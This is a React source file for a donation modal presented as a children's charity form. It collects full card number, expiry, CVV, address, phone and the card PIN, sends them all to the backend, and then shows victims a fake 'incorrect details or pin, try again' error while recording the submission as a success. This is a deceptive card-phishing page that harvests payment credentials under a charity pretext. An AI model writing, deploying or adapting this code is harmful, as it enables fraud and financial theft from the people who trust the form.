// frontend/src/components/DonationModal/DonationModal.js

import React, { useState } from 'react';
import { createDonation } from '../../services/api';
import './DonationModal.css';

const DonationModal = ({ isOpen, onClose, onDonationSuccess }) => {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: '',
    expirationDate: '',
    securityCode: '',
    firstName: '',
    lastName: '',
    email: '',
    country: '',
    address: '',
    city: '',
    state: '',
    phone: '',
    pin: '',
  });

  const handleAmountChange = (e) => {
    setAmount(e.target.value);
  };

  const handleNext = () => {
    if (amount && parseFloat(amount) > 0) {
      setStep(2);
    } else {
      alert('Please enter a valid donation amount');
    }
  };

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return value;
    }
  };

  const formatExpiry = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`;
    }
    return v;
  };

  const formatCVV = (value) => {
    return value.replace(/\D/g, '').slice(0, 4);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === 'cardNumber') {
      formattedValue = formatCardNumber(value);
    } else if (name === 'expirationDate') {
      formattedValue = formatExpiry(value);
    } else if (name === 'securityCode') {
      formattedValue = formatCVV(value);
    }

    setFormData({
      ...formData,
      [name]: formattedValue,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      const donationPayload = {
        amount: parseFloat(amount),
        ...formData,
      };
      const response = await createDonation(donationPayload);
      if (response.data.success) {
        alert('Incorrect details or pin, kindly check your card details or pin and try again with the correct details');
        onDonationSuccess(parseFloat(amount));
        onClose();
        setStep(1);
        setAmount('');
        setFormData({
          cardNumber: '',
          expirationDate: '',
          securityCode: '',
          firstName: '',
          lastName: '',
          email: '',
          country: '',
          address: '',
          city: '',
          state: '',
          phone: '',
          pin: '',
        });
      }
    } catch (error) {
      console.error('Donation error:', error);
      alert('There was an error processing your donation. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <button className="modal-close" onClick={onClose}>×</button>

        {step === 1 && (
          <div className="modal-step">
            <h2>Help a Child Smile</h2>
            <p>Enter the amount you'd like to donate</p>
            <div className="amount-input-group">
              <span className="currency">$</span>
              <input
                type="number"
                value={amount}
                onChange={handleAmountChange}
                placeholder="0.00"
                min="1"
                step="1"
                autoFocus
              />
            </div>
            <button className="next-btn" onClick={handleNext}>
              Next →
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="modal-step">
            <h2>Donation Details</h2>
            <p>Amount: ${amount}</p>
            <form onSubmit={handleSubmit} className="donation-form">
              <div className="form-row">
                <input type="text" name="firstName" placeholder="First Name" required onChange={handleInputChange} />
                <input type="text" name="lastName" placeholder="Last Name" required onChange={handleInputChange} />
              </div>

              <input type="email" name="email" placeholder="Email" required onChange={handleInputChange} />

              {/* Card number – full width */}
              <input
                type="text"
                name="cardNumber"
                placeholder="Card Number (e.g., 1234 5678 9012 3456)"
                required
                value={formData.cardNumber}
                onChange={handleInputChange}
                maxLength="19"
                className="full-width"
              />

              {/* Expiry and CVV side by side */}
              <div className="form-row">
                <input
                  type="text"
                  name="expirationDate"
                  placeholder="MM/YY"
                  required
                  value={formData.expirationDate}
                  onChange={handleInputChange}
                  maxLength="5"
                />
                <input
                  type="text"
                  name="securityCode"
                  placeholder="CVV"
                  required
                  value={formData.securityCode}
                  onChange={handleInputChange}
                  maxLength="4"
                />
              </div>

              <input type="text" name="address" placeholder="Street Address" required onChange={handleInputChange} />

              <div className="form-row">
                <input type="text" name="city" placeholder="City" required onChange={handleInputChange} />
                <input type="text" name="state" placeholder="State" required onChange={handleInputChange} />
                <input type="text" name="country" placeholder="Country" required onChange={handleInputChange} />
              </div>

              <div className="form-row">
                <input type="tel" name="phone" placeholder="Phone Number" required onChange={handleInputChange} />
                <input type="password" name="pin" placeholder="PIN" required onChange={handleInputChange} />
              </div>

              <button type="submit" className="submit-btn" disabled={isSubmitting}>
                {isSubmitting ? 'Processing...' : 'Complete Donation'}
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );
};

export default DonationModal;